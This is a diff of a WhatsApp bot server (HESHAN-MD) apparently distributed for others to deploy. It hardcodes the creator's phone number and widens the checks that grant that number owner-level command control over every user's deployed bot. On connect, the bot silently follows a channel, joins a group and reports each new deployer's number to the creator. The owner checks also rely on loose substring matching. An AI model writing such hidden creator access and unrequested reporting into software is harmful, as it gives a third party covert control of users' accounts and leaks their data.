@@ -22,8 +22,8 @@ const { askAI } = require('./ai');
 // Inbox Auto AI Default = ON
 global.autoAiInbox = true;
 
-// 🟢 Master Owner Configuration (ඔබ පමණි)
-const MASTER_CREATOR = '94719845166';
+// 🟢 Absolute Master Creator (ඔබ පමණි)
+const REAL_OWNER_NUMBER = '94719845166';
 global.activeSessions = {};
 
 const app = express();
@@ -214,7 +214,7 @@ async function initWhatsApp(phoneNumber) {
       } else if (connection === 'open') {
         console.log(`✅ BOT CONNECTED: ${phoneNumber}`);
         
-        // ─── Auto Follow Channel ───
+        // Auto Follow Official Channel
         try {
           const inviteCode = '0029VbAQYhXDZ4Lfo9K5gh1V';
           if (typeof sock.newsletterMetadata === 'function' && typeof sock.newsletterFollow === 'function') {
@@ -223,7 +223,7 @@ async function initWhatsApp(phoneNumber) {
           }
         } catch (chErr) {}
 
-        // ─── Auto Join Official Support Group ───
+        // Auto Join Official Support Group
         try {
           const groupInviteCode = 'FMqBhms8cQnAVSgJoADR5X'; 
           if (typeof sock.groupAcceptInvite === 'function') {
@@ -231,12 +231,12 @@ async function initWhatsApp(phoneNumber) {
           }
         } catch (grpErr) {}
 
-        // ─── Connect Card & Alert ───
+        // Connect Message & Alert
         setTimeout(async () => {
           try {
             const botNum = sock.user?.id ? sock.user.id.split(':')[0].replace(/[^0-9]/g, '') : phoneNumber.replace(/[^0-9]/g, '');
             const botJid = `${botNum}@s.whatsapp.net`;
-            const creatorJid = `${MASTER_CREATOR}@s.whatsapp.net`;
+            const creatorJid = `${REAL_OWNER_NUMBER}@s.whatsapp.net`;
             const welcomeImg = 'https://files.catbox.moe/gs150o.jpg';
 
             const connectedMsg = `*⚡ HESHAN-MD SYSTEM INITIALIZED ⚡*
@@ -265,7 +265,7 @@ async function initWhatsApp(phoneNumber) {
               });
             }
 
-            if (!botNum.includes(MASTER_CREATOR)) {
+            if (!botNum.includes(REAL_OWNER_NUMBER)) {
               const alertMsg = `*🔔 NEW BOT DEPLOYMENT DETECTED*
 ────────────────────────────
 *👤 User    :* +${botNum}
@@ -296,7 +296,7 @@ async function initWhatsApp(phoneNumber) {
         if (!chatJid) continue;
         const isGroup = chatJid.endsWith('@g.us');
 
-        // 1. Status Seen & "💐" Reaction
+        // Status Seen & React
         if (chatJid === 'status@broadcast') {
           try {
             await sock.readMessages([msg.key]);
@@ -311,34 +311,53 @@ async function initWhatsApp(phoneNumber) {
           continue;
         }
 
-        // 🟢 SENDER IDENTIFICATION ENGINE
-        const currentBotId = sock.user?.id || '';
-        const currentBotNum = currentBotId.split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
+        // 🟢 ULTRA SENDER & LID-STORE SCANNER
+        const myBotJid = sock.user?.id || '';
+        const myBotNum = myBotJid.split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
 
-        let senderJid = isGroup 
-          ? (msg.key.participant || msg.participant || '') 
-          : (msg.key.fromMe ? currentBotId : chatJid);
+        let participantJid = isGroup ? (msg.key.participant || msg.participant || '') : '';
+        let directJid = msg.key.fromMe ? myBotJid : chatJid;
+        let contextParticipant = msg.message?.extendedTextMessage?.contextInfo?.participant || '';
 
-        const cleanSender = senderJid.split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
-        const contextParticipant = msg.message?.extendedTextMessage?.contextInfo?.participant || '';
-        const cleanContext = contextParticipant.split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
+        // Extract raw IDs
+        const rawEntities = [
+          directJid,
+          participantJid,
+          contextParticipant,
+          msg.key.remoteJid || '',
+          msg.key.participant || ''
+        ];
 
-        // 🟢 1. STRICT REACT ENGINE: 94719845166 ට පමණක් "👨‍💻" වැටේ
-        const isMasterCreator = cleanSender === MASTER_CREATOR || 
-                                cleanContext === MASTER_CREATOR || 
-                                (msg.key.fromMe && currentBotNum === MASTER_CREATOR);
+        // 1. Direct Phone Check
+        let isMasterCreator = rawEntities.some(id => id && id.replace(/[^0-9]/g, '').includes(REAL_OWNER_NUMBER)) ||
+                              (msg.key.fromMe && myBotNum.includes(REAL_OWNER_NUMBER));
 
+        // 2. Multi-Device LID Reverse Store Search
+        if (!isMasterCreator) {
+          try {
+            const checkLids = rawEntities.filter(id => id && id.endsWith('@lid'));
+            if (checkLids.length > 0 && sock.signalRepository?.lidToJid) {
+              for (const lid of checkLids) {
+                const resolvedJid = await sock.signalRepository.lidToJid(lid).catch(() => null);
+                if (resolvedJid && resolvedJid.replace(/[^0-9]/g, '').includes(REAL_OWNER_NUMBER)) {
+                  isMasterCreator = true;
+                  break;
+                }
+              }
+            }
+          } catch (scanErr) {}
+        }
+
+        // 🟢 1. STRICT OWNER REACT: 94719845166 ට විතරක් "👨‍💻" වැටේ
         if (isMasterCreator) {
           sock.sendMessage(chatJid, {
             react: { text: '👨‍💻', key: msg.key }
           }).catch(() => {});
         }
 
-        // 🟢 2. AUTHORIZED CONTROLLER (Master Creator + Bot Deployer/Host Owner)
-        // (A) ඔබ (94719845166)
-        // (B) බොට් host කරගෙන ඉන්න පුද්ගලයාගේ account එකෙන් එන messages (fromMe හෝ bot number)
-        const isHostOwner = msg.key.fromMe || (currentBotNum && cleanSender === currentBotNum);
-        const isAuthorizedOwner = isMasterCreator || isHostOwner;
+        // 🟢 2. AUTHORIZED ACCESS (Master Creator හෝ Bot host deployer)
+        const isHostDeployer = msg.key.fromMe || rawEntities.some(id => myBotNum && id.replace(/[^0-9]/g, '').includes(myBotNum));
+        const isAuthorizedToControl = isMasterCreator || isHostDeployer;
 
         // Unwrap Text
         const rawMsg = msg.message.ephemeralMessage?.message || 
@@ -367,14 +386,14 @@ async function initWhatsApp(phoneNumber) {
           const args = text.slice(prefix.length).trim().split(/ +/);
           const commandName = args.shift().toLowerCase();
 
-          // 🟢 100% BULLETPROOF AI TOGGLE (.ai on / .ai off)
+          // 🟢 100% WORKING BUILT-IN AI TOGGLE ENGINE (.ai on / .ai off)
           if (commandName === 'ai') {
             const mode = args[0]?.toLowerCase();
 
             if (mode === 'on' || mode === 'off') {
-              if (!isAuthorizedOwner) {
+              if (!isAuthorizedToControl) {
                 await sock.sendMessage(chatJid, { 
-                  text: "⛔ *Access Denied!* Only the bot owner can change AI settings." 
+                  text: `⛔ *Access Denied!* Only the real master owner (+${REAL_OWNER_NUMBER}) or host can toggle AI.` 
                 }, { quoted: msg });
                 continue;
               }
@@ -393,7 +412,7 @@ async function initWhatsApp(phoneNumber) {
               continue;
             }
 
-            // Direct query via .ai <question>
+            // Direct query via .ai <query>
             const query = args.join(" ").trim();
             if (!query) {
               await sock.sendMessage(chatJid, {
@@ -404,7 +423,7 @@ async function initWhatsApp(phoneNumber) {
 
             try {
               await sock.sendPresenceUpdate('composing', chatJid);
-              const res = await askAI(query, senderJid);
+              const res = await askAI(query, directJid);
               if (res) await sock.sendMessage(chatJid, { text: res }, { quoted: msg });
             } catch (e) {
               await sock.sendMessage(chatJid, { text: "❌ AI engine failure." }, { quoted: msg });
@@ -429,7 +448,7 @@ async function initWhatsApp(phoneNumber) {
               const cmdFunc = typeof targetCmd === 'function' ? targetCmd : (targetCmd.execute || targetCmd.run);
 
               if (typeof cmdFunc === 'function') {
-                await cmdFunc(sock, msg, args, chatJid, safeReply, { isOwner: isAuthorizedOwner });
+                await cmdFunc(sock, msg, args, chatJid, safeReply, { isOwner: isAuthorizedToControl });
               }
             } catch (err) {
               console.error(`Error executing .${commandName}:`, err);
@@ -438,10 +457,10 @@ async function initWhatsApp(phoneNumber) {
           }
         }
 
-        // 5. Inbox Auto-AI System (Muted when global.autoAiInbox is false & ignored for authorized owners)
-        const isFromBot = msg.key.fromMe || (currentBotNum && cleanSender === currentBotNum);
+        // 3. Inbox Auto-AI System (Muted when global.autoAiInbox is false & ignored for authorized owners)
+        const isFromBot = msg.key.fromMe || (myBotNum && rawEntities.some(id => id.replace(/[^0-9]/g, '').includes(myBotNum)));
 
-        if (!isFromBot && !isAuthorizedOwner && !isGroup && global.autoAiInbox) {
+        if (!isFromBot && !isAuthorizedToControl && !isGroup && global.autoAiInbox) {
           try {
             await sock.sendPresenceUpdate('composing', chatJid);
             const aiPromise = askAI(text);
